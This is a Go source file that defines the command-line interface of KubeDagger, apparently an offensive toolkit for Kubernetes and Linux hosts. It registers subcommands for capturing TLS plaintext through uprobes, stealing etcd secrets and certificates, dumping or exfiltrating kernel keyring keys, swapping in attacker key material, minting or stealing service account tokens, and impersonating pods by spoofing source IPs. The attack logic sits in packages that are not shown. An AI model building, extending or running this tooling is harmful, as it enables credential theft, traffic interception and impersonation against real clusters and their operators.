package run

import (
	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/etcd_theft"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/keyring"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/keyring_mitm"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pod_identity"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/sa_token"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tls_intercept"
)

var cmdTLSIntercept = &cobra.Command{
	Use:   "tls-intercept",
	Short: "TLS traffic interception",
	Long:  "tls-intercept attaches uprobes to SSL_read/SSL_write to capture plaintext before encryption",
	RunE:  tlsInterceptCmd,
}

var cmdEtcdTheft = &cobra.Command{
	Use:   "etcd-steal",
	Short: "Etcd credential theft",
	Long:  "etcd-steal intercepts etcd traffic to extract secrets, tokens, and client certificates",
	RunE:  etcdTheftCmd,
}

var cmdKeyring = &cobra.Command{
	Use:   "keyring",
	Short: "Kernel keyring theft",
	Long:  "keyring steals encryption keys, Kerberos tickets, and eCryptfs keys from the kernel keyring subsystem",
	RunE:  keyringCmd,
}

var cmdKeyringMITM = &cobra.Command{
	Use:   "keyring-mitm",
	Short: "Kernel keyring MITM",
	Long:  "keyring-mitm intercepts key_create_or_update to replace key material with attacker-controlled values",
	RunE:  keyringMITMCmd,
}

var cmdSAToken = &cobra.Command{
	Use:   "sa-token",
	Short: "Service account token minting/theft",
	Long:  "sa-token mints or steals Kubernetes service account tokens with elevated permissions",
	RunE:  saTokenCmd,
}

var cmdPodIdentity = &cobra.Command{
	Use:   "pod-identity",
	Short: "Pod identity theft",
	Long:  "pod-identity steals projected SA tokens and spoofs source IP to impersonate other pods",
	RunE:  podIdentityCmd,
}

func tlsInterceptCmd(cmd *cobra.Command, args []string) error {
	return tls_intercept.Execute(options.Target, options.TLSAction, options.TLSTargetPID, options.TLSLib, options.Output)
}

func etcdTheftCmd(cmd *cobra.Command, args []string) error {
	return etcd_theft.Execute(options.Target, options.EtcdMode, options.EtcdKeyPrefix, options.Output)
}

func keyringCmd(cmd *cobra.Command, args []string) error {
	return keyring.Steal(options.Target, options.KeyringMode, options.KeyringKeyType, options.Output)
}

func keyringMITMCmd(cmd *cobra.Command, args []string) error {
	return keyring_mitm.Execute(options.Target, options.KeyringMITMType, options.KeyringMITMReplace, options.Output)
}

func saTokenCmd(cmd *cobra.Command, args []string) error {
	return sa_token.Execute(options.Target, options.SATokenAction, options.SATokenName, options.SATokenNS, options.SATokenAudience, options.Output)
}

func podIdentityCmd(cmd *cobra.Command, args []string) error {
	return pod_identity.Execute(options.Target, options.PodIDTargetPod, options.PodIDNamespace, options.PodIDAction, options.Output)
}

func init() {
	cmdTLSIntercept.PersistentFlags().StringVar(
		&options.TLSAction,
		"action",
		"attach",
		"TLS action: attach, dump, or detach")
	cmdTLSIntercept.PersistentFlags().StringVar(
		&options.TLSTargetPID,
		"pid",
		"",
		"target process PID for uprobe attachment")
	cmdTLSIntercept.PersistentFlags().StringVar(
		&options.TLSLib,
		"lib",
		"openssl",
		"TLS library: openssl or gnutls")
	cmdTLSIntercept.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdTLSIntercept)

	cmdEtcdTheft.PersistentFlags().StringVar(
		&options.EtcdMode,
		"mode",
		"intercept",
		"theft mode: intercept, dump-keys, or steal-certs")
	cmdEtcdTheft.PersistentFlags().StringVar(
		&options.EtcdKeyPrefix,
		"key-prefix",
		"/registry/secrets",
		"etcd key prefix to target")
	cmdEtcdTheft.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdEtcdTheft)

	cmdKeyring.PersistentFlags().StringVar(
		&options.KeyringMode,
		"mode",
		"dump",
		"keyring mode: dump, watch, or exfil")
	cmdKeyring.PersistentFlags().StringVar(
		&options.KeyringKeyType,
		"key-type",
		"all",
		"key type to target: user, logon, session, or all")
	cmdKeyring.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdKeyring)

	cmdKeyringMITM.PersistentFlags().StringVar(
		&options.KeyringMITMType,
		"target-key-type",
		"user",
		"key type to intercept: user, logon, or all")
	cmdKeyringMITM.PersistentFlags().StringVar(
		&options.KeyringMITMReplace,
		"replace-with",
		"",
		"path to attacker key material for substitution")
	cmdKeyringMITM.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdKeyringMITM)

	cmdSAToken.PersistentFlags().StringVar(
		&options.SATokenAction,
		"action",
		"mint",
		"action: mint or steal")
	cmdSAToken.PersistentFlags().StringVar(
		&options.SATokenName,
		"service-account",
		"",
		"target service account name")
	cmdSAToken.PersistentFlags().StringVar(
		&options.SATokenNS,
		"namespace",
		"default",
		"target namespace")
	cmdSAToken.PersistentFlags().StringVar(
		&options.SATokenAudience,
		"audience",
		"",
		"token audience for TokenRequest API")
	cmdSAToken.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdSAToken)

	cmdPodIdentity.PersistentFlags().StringVar(
		&options.PodIDTargetPod,
		"target-pod",
		"",
		"target pod to steal identity from")
	cmdPodIdentity.PersistentFlags().StringVar(
		&options.PodIDNamespace,
		"namespace",
		"default",
		"target pod namespace")
	cmdPodIdentity.PersistentFlags().StringVar(
		&options.PodIDAction,
		"action",
		"steal",
		"action: steal or impersonate")
	cmdPodIdentity.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdPodIdentity)
}
